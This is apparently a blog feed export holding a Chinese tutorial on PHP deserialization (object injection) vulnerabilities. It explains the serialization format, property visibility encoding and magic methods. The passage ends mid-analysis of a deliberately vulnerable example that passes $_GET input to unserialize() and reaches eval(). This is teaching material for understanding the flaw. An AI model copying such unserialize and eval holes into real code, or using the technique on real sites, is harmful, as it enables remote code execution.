class="number">0</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.php&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$player</span> = <span class="keyword">new</span> <span class="title function_ invoke__">player</span>(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;caches/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]), <span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$player</span>))); </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;Welcome %s, your ip is %s\n&#x27;</span>, <span class="variable">$username</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Please input the username or password!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://blog.csdn.net/mizhenxiao/article/details/51922965">https://blog.csdn.net/mizhenxiao/article/details/51922965</a></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
          <category> pop链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP反序列化漏洞 </tag>
            
            <tag> POP链构造 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次再学习，深入理解 PHP反序列化漏洞学习和总结</title>
      <link href="/2021/05/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/05/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>再次学习，希望在对整个 PHP 反序列化漏洞的剖析学习过程中对其有更深入的理解，以便能更深入的利用</p></blockquote><h2 id="刨根知底：什么是序列化和什么是反序列化"><a href="#刨根知底：什么是序列化和什么是反序列化" class="headerlink" title="刨根知底：什么是序列化和什么是反序列化"></a>刨根知底：什么是序列化和什么是反序列化</h2><h3 id="序列化与JSON数据类型的对比"><a href="#序列化与JSON数据类型的对比" class="headerlink" title="序列化与JSON数据类型的对比"></a>序列化与JSON数据类型的对比</h3><p>首先，我们先来看看JSON 数据类型是什么样的？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;Hopper&quot;,&quot;age&quot;:18,&quot;hobby&quot;:&quot;code&quot;&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到不同组数据之间都是使用逗号分隔，每组数据内部使用冒号分隔键和值，整体看上去是一个字符串的样子，那么他原来的面目是什么呢？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;Hopper&quot;</span>,<span class="string">&quot;age&quot;</span> =&gt; <span class="number">18</span>, <span class="string">&quot;hobby&quot;</span> =&gt; <span class="string">&quot;code&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$arr</span>);</span><br></pre></td></tr></table></figure><p>可以看到，这个 json 字符串后面的代码是一个数组，但是通常情况下为了前后端之间的传输方便我们将其 json_encode 了，然后我们后端如果接受到这个 json 数据，还能在 json_decode 回来，再通俗一点就是某些时候，不支持直接传输文件夹，我们必须要压缩一下然后传输，对方接收到需要解压才能看到你的数据，那么这种将原本的数据通过某种手段进行“压缩”，并且按照一定的格式存储的过程就可以称之为序列化</p><blockquote><p>那同样类比，什么是PHP的序列化呢</p></blockquote><h2 id="PHP的序列化"><a href="#PHP的序列化" class="headerlink" title="PHP的序列化"></a>PHP的序列化</h2><p>PHP 的所谓的序列化也是一个将各种类型的数据，压缩并按照一定格式存储的过程，他所使用的函数是serialize() ,我们来看下面的实例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span> = <span class="string">&quot;Inactive&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$test</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test1</span> = <span class="string">&quot;test1&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_flag</span>(<span class="params"><span class="variable">$flag</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;flag = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$object</span>-&gt;<span class="title function_ invoke__">set_flag</span>(<span class="string">&#x27;Inactive&#x27;</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$object</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br></pre></td></tr></table></figure><p>这是一个简单的 php 类，然后我们实例化以后对其属性进行了赋值，然后调用了 serialize() 并且输出，我们看一下输出的结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot; test flag&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;Inactive&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot; * test&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;test1&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;test1&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里属性名和属性值的格式与前面对象名的格式类似</p></blockquote><p><a data-fancybox="gallery" data-src="https://i.imgtg.com/2022/05/07/ztObi.png" data-caption="ztObi.png"><img src="https://i.imgtg.com/2022/05/07/ztObi.png" alt="ztObi.png"></a></p><h3 id="PHP序列化的权限问题"><a href="#PHP序列化的权限问题" class="headerlink" title="PHP序列化的权限问题"></a>PHP序列化的权限问题</h3><blockquote><p><strong>注意：这里有个非常重要的点</strong></p></blockquote><ol><li>细心的你，可能会注意到一个小问题，按照我前面对象名的格式算的话你可能会发现后面的属性名有些出路，</li><li>如：我代码里面明明写的是 flag 属性，序列化以后却变成了 testflag ，而且前面说好的长度也不一样了，testflag<br>明明是8个字符，到你这里却成了10个，除此之外后面的 test 属性也“变异了”，前面多了个（*）并且长度也不对，这到底是怎么回事？</li></ol><p>当你发现这个问题，那么说明你认真地思考了，这其实涉及到了 PHP 的属性的访问权限问题，序列化为了能把整个类对象的各种信息完完整整的压缩，格式化，必然也会将属性的权限序列化进去，我们发现我定义的类的属性有三种 private protected 和 默认的 public(写不写都一样)，其中</p><p><strong>(1)Puiblic 权限：</strong></p><p>他的序列化规规矩矩，按照我们常规的思路，该是几个字符就是几个字符，你看那个 test1 属性，就正如这样</p><br><p><strong>(2)Private 权限：</strong></p><p>该权限是私有权限，也就是说只能 test类使用，于是乎 test 有着强烈的占有欲，于是在序列化的时候一定要在 private 属性前面加上自己的名字，向世界表明这个属性是我独自占有的，但是好像长度还是不对，还少了两个，这是怎么回事？</p><p>那我们将其序列化的结果存入一个文件中，我们使用 Hexdump 看一下内部的结构，为了去除浏览器对整个过程的影响我修改一下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span> = <span class="string">&quot;Inactive&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$test</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test1</span> = <span class="string">&quot;test1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$object</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span></span><br></pre></td></tr></table></figure><br><h4 id="public-权限"><a href="#public-权限" class="headerlink" title="public 权限"></a>public 权限</h4><p>输出前后一样</p><br><h4 id="private-权限"><a href="#private-权限" class="headerlink" title="private 权限"></a>private 权限</h4><p><a data-fancybox="gallery" data-src="https://i.imgtg.com/2022/05/07/ztx6q.png" data-caption="ztx6q.png"><img src="https://i.imgtg.com/2022/05/07/ztx6q.png" alt="ztx6q.png"></a></p><p>我们看到 test 的前后出现了两个 %00 ，也就是空白符，现在是不是字符数也凑够了？那么现在请记住这个规定，在私有属性序列化的时候格式是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">00</span>类名%<span class="number">00</span>属性名</span><br></pre></td></tr></table></figure><br><h4 id="protected-权限"><a href="#protected-权限" class="headerlink" title="protected 权限"></a>protected 权限</h4><p>我们直接看看 hexdump 的结果</p><p><a data-fancybox="gallery" data-src="https://i.imgtg.com/2022/05/07/ztiYM.png" data-caption="ztiYM.png"><img src="https://i.imgtg.com/2022/05/07/ztiYM.png" alt="ztiYM.png"></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">00</span>*%<span class="number">00</span>属性名</span><br></pre></td></tr></table></figure><br><h3 id="PHP-序列化的注意问题"><a href="#PHP-序列化的注意问题" class="headerlink" title="PHP 序列化的注意问题"></a>PHP 序列化的注意问题</h3><blockquote><p>注意的点</p></blockquote><p>如果你再细致一点，你可能会发现这样一个问题，你这个类定义了那么多方法，怎么把对象序列化了以后全都丢了？你看你整个序列化的字符串里面全是属性，就没有一个方法，这是为什么？</p><p><strong>请记住，序列化他只序列化属性，不序列化方法，这个性质就引出了两个非常重要的话题：</strong></p><br><p><strong>(1)我们在反序列化的时候一定要保证在当前的作用域环境下有该类存在</strong></p><p>这里不得不扯出反序列化的问题，这里先简单说一下，反序列化就是将我们压缩格式化的对象还原成初始状态的过程（可以认为是解压缩的过程），因为我们没有序列化方法，因此在反序列化以后我们如果想正常使用这个对象的话我们必须要依托于这个类要在当前作用域存在的条件。</p><p><strong>(2)我们在反序列化攻击的时候也就是依托类属性进行攻击</strong></p><p>因为没有序列化方法嘛，我们能控制的只有类的属性，因此类属性就是我们唯一的攻击入口，在我们的攻击流程中，我们就是要寻找合适的能被我们控制的属性，然后利用它本身的存在的方法，在基于属性被控制的情况下发动我们的发序列化攻击（这是我们攻击的核心思想，这里先借此机会抛出来，有一个印象）</p><h2 id="PHP-的反序列化"><a href="#PHP-的反序列化" class="headerlink" title="PHP 的反序列化"></a>PHP 的反序列化</h2><p><strong>有序列化 化对象为压缩格式化的字符串，就有反序列化，将压缩格式化的字符串还原</strong></p><p>我们还是沿用上面的代码，我现在将 serialize.txt 里面的内容进行反序列化，并输出对应属性的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span> = <span class="string">&quot;Inactive&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$test</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test1</span> = <span class="string">&quot;test1&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_flag</span>(<span class="params"><span class="variable">$flag</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;flag = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;serialize.txt&quot;</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>-&gt;test1.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">get_flag</span>();</span><br></pre></td></tr></table></figure><p>serialize.txt 保存的是PHP序列化的内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot; test flag&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;Inactive&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot; * test&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;test1&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;test1&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>PHP反序列化后输出的结果：</p><p><a data-fancybox="gallery" data-src="https://i.imgtg.com/2022/05/07/z4pzv.png" data-caption="z4pzv.png"><img src="https://i.imgtg.com/2022/05/07/z4pzv.png" alt="z4pzv.png"></a></p><p>我们可以看到本来存储在文件中的一串字符，在 uiseralize() 的作用下还原成了对象，并且实现了 属性和方法的调用</p><blockquote><p>那试想下，某人想使坏，在电脑主人不知道的情况下悄悄改了这个 serialize.txt 的内容，改成了下面这样<strong>（注意红色方框的部分）</strong></p></blockquote><p><a data-fancybox="gallery" data-src="https://i.imgtg.com/2022/05/07/z4tTr.png" data-caption="z4tTr.png"><img src="https://i.imgtg.com/2022/05/07/z4tTr.png" alt="z4tTr.png"></a></p><p>那反序列化的结果就与之前的结果完全不一样</p><p><a data-fancybox="gallery" data-src="https://i.imgtg.com/2022/05/07/z44vM.png" data-caption="z44vM.png"><img src="https://i.imgtg.com/2022/05/07/z44vM.png" alt="z44vM.png"></a></p><p>看到这里，其实就是我们反序列化攻击的原理的核心内容</p><br><h2 id="为什么要-PHP-的序列化和反序列化呢？"><a href="#为什么要-PHP-的序列化和反序列化呢？" class="headerlink" title="为什么要 PHP 的序列化和反序列化呢？"></a>为什么要 PHP 的序列化和反序列化呢？</h2><p>其实这个问题和前面的 json 是为了传递数据的方便性是类似的：</p><p>当然，传递数据的方便肯定是这种压缩并格式化存储的一大共同的属性，那么序列化除了这种属性以外还有什么特性呢？要是只是这样那干脆不如直接用 json 好了，当然有，从上面的实验中你没发现吗？我们把一个实例化的对象长久地存储在了计算机的磁盘上，无论什么时候调用都能恢复原来的样子，这其实是为了解决 PHP 对象传递的一个问题,因为 PHP 文件在执行结束以后就会将对象销毁，那么如果下次有一个页面恰好要用到刚刚销毁的对象就会束手无策，总不能你永远不让它销毁，等着你吧，于是人们就想出了一种能长久保存对象的方法，这就是 PHP 的序列化，那当我们下次要用的时候只要反序列化一下就 ok 了，这就方便了很多。</p><br><h2 id="PHP的反序列化漏洞"><a href="#PHP的反序列化漏洞" class="headerlink" title="PHP的反序列化漏洞"></a>PHP的反序列化漏洞</h2><h3 id="一，概念解释"><a href="#一，概念解释" class="headerlink" title="一，概念解释"></a>一，概念解释</h3><p>PHP 反序列化漏洞又叫做 PHP 对象注入漏洞，这种叫法本质来讲挺偏的，也不能说明根本的问题，通过上面的验证，我们可以知道其实主要是在于它的对象属性被篡改，所以叫 PHP 对象的属性篡改漏洞更好…(gege~~)</p><p>反序列化漏洞的成因在于代码中的 unserialize() 接收的参数可控，从上面的例子看，这个函数的参数是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改实现最终的攻击。</p><br><h3 id="二，常见的魔法方法"><a href="#二，常见的魔法方法" class="headerlink" title="二，常见的魔法方法"></a>二，常见的魔法方法</h3><p>这里就不得不介绍几个我们必须知道的魔法方法了</p><ol><li><strong>construct()：</strong>   当对象创建时会自动调用(但在unserialize()时是不会自动调用的)。</li><li><strong>wakeup() ：</strong>  unserialize()时会自动调用</li><li><strong>destruct()：</strong>  当对象被销毁时会自动调用</li><li><strong>toString()</strong>:     当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用</li><li><strong>get()</strong> :       当从不可访问的属性读取数据</li><li><strong>call()</strong>:       在对象上下文中调用不可访问的方法时触发</li></ol><blockquote><p>特别强调一下第四点</p></blockquote><p>这个 __toString 触发的条件比较多，也因为这个原因容易被忽略，常见的触发条件有下面几种</p><p>(1)echo (<code>$obj</code>) &#x2F; print(<code>$obj</code>) 打印时会触发</p><p>(2)反序列化对象与字符串连接时</p><p>(3)反序列化对象参与格式化字符串时</p><p>(4)反序列化对象与字符串进行&#x3D;&#x3D;比较时（PHP进行&#x3D;&#x3D;比较的时候会转换参数类型）</p><p>(5)反序列化对象参与格式化SQL语句，绑定参数时</p><p>(6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时</p><p>(7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有<strong>toString返回的字符串的时候</strong>toString会被调用</p><p>(8)反序列化的对象作为 class_exists() 的参数的时候</p><br><h3 id="三，为什么需要提到这些魔法函数"><a href="#三，为什么需要提到这些魔法函数" class="headerlink" title="三，为什么需要提到这些魔法函数"></a>三，为什么需要提到这些魔法函数</h3><p>为什么要提到这些魔法方法？你看上面的实现的最简单的攻击不是也没有用到魔法方法吗？</p><p>我们上面讲过，在我们的攻击中，反序列化函数 unserialize() 是我们攻击的入口，也就是说，只要这个参数可控，我们就能传入任何的已经序列化的对象（只要这个类在当前作用域存在我们就可以利用），而不是局限于出现 unserialize() 函数的类的对象，如果只能局限于当前类，那我们的攻击面也太狭小了，这个类不调用危险的方法我们就没法发起攻击。</p><p>但是我们又知道，你反序列化了其他的类对象以后我们只是控制了是属性，如果你没有在完成反序列化后的代码中调用其他类对象的方法，我们还是束手无策，毕竟代码是人家写的，人家本身就是要反序列化后调用该类的某个安全的方法，你总不能改人家的代码吧，但是没关系，因为我们有魔法方法。</p><p>魔法正如上面介绍的，魔法方法的调用是在该类序列化或者反序列化的同时自动完成的，不需要人工干预，这就非常符合我们的想法，因此只要魔法方法中出现了一些我们能利用的函数，我们就能通过反序列化中对其对象属性的操控来实现对这些函数的操控，进而达到我们发动攻击的目的。</p><br><h3 id="四，调用魔法函数的例子"><a href="#四，调用魔法函数的例子" class="headerlink" title="四，调用魔法函数的例子"></a>四，调用魔法函数的例子</h3><p>我们来看一个反序列化的案例，加强一下我们对这个魔法方法的理解</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hopper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span> = <span class="string">&quot;hopper&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__sleep&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__wakeup&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;__toString&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$hopper_old</span> = <span class="keyword">new</span> hopper;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$hopper_old</span>);</span><br><span class="line"><span class="variable">$hopper_new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$hopper_new</span>);</span><br></pre></td></tr></table></figure><p>测试的结果：</p><p><a data-fancybox="gallery" data-src="https://i.imgtg.com/2022/05/08/z4QuF.png" data-caption="z4QuF.png"><img src="https://i.imgtg.com/2022/05/08/z4QuF.png" alt="z4QuF.png"></a></p><p>根据上面说的魔法方法的触发规则分析一下这个结果是怎么来的，这里 __destruct 了两次说明当前实际上有两个对象，一个就是实例化的时候创建的对象，另一个就是反序列化后生成的对象。</p><h3 id="五，利用魔法函数进行攻击"><a href="#五，利用魔法函数进行攻击" class="headerlink" title="五，利用魔法函数进行攻击"></a>五，利用魔法函数进行攻击</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hopper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Hopper</span> = <span class="string">&quot;i am Hopper&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">L</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">L</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to XDSEC&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>我们先来分析一下这段代码，首先我们能看到 unserialize() 